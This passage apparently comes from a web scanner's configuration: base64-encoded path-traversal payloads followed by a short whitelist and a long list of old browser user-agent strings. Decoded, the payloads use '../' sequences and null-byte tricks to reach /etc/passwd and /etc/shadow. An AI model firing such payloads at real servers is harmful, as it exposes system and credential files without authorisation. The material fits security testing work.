'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==',
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==', 
'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdyUwMA==']
Base_64_white_list=[
'dist',
'fileblog',
'anli',
'blog',
'ant',
'Kiss',
'file',
'ants',
'fico',
'bios',
'LENS',
'TWRP',
'UTF8',
'Kiwi'
]
USR_AGENTS=[
'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE51-1/220.34.37; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/11.0.026; Profile MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (SymbianOS/9.3; U; Series60/3.2 Nokia5630d-1/012.020; Profile MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (SymbianOS/9.3; U; Series60/3.2 NokiaN78-1/12.046; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-3/21.2.045; Profile/MIDP-2.1 Configuration/CLDC-1.1;) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.4', 
'Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 Nokia5530c-2/10.0.050; Profile MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Safari/525', 
'Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 Nokia5800d-1/31.0.101; Profile MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (webOS/1.4.0; U; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Version/1.0 Safari/532.2 Pre/1.0', 
'Mozilla/5.0 (webOS/Palm webOS 1.2.9; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Pixi/1.0', 
'Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1', 
'Mozilla/5.0 (Windows; U; Win98; en-US; rv:x.xx) Gecko/20030423 Firebird Browser/0.6', 
'Mozilla/5.0 (Windows; U; Win9x; en; Stable) Gecko/20020911 Beonex/0.8.1-stable', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008092215 Firefox/3.0.1 Orca/1.1 beta 3', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.x.x) Gecko/20041107 Firefox/x.x', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xx) Gecko/20030504 Mozilla Firebird/0.6', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xxx) Gecko/20041027 Mnenhy/0.6.0.104', 
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5', 
'Mozilla/5.0 (Windows; U;XMPP Tiscali Communicator v.10.0.1; Windows NT 5.1; it; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3', 
'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1', 
'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01', 
'Mozilla/5.0 (X11; U; Linux armv7l; en-GB; rv:1.9.2b6pre) Gecko/20100318 Firefox/3.5 Maemo Browser 1.7.4.8 RX-51 N900', 
'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0', 
'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; Nautilus/1.0Final) Gecko/20020408', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20021007 Phoenix/0.3', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040413 Epiphany/1.2.1', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 SnapPreviewBot', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061129 BonEcho/2.0', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)', 
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9a8) Gecko/2007100619 GranParadiso/3.0a8', 
]
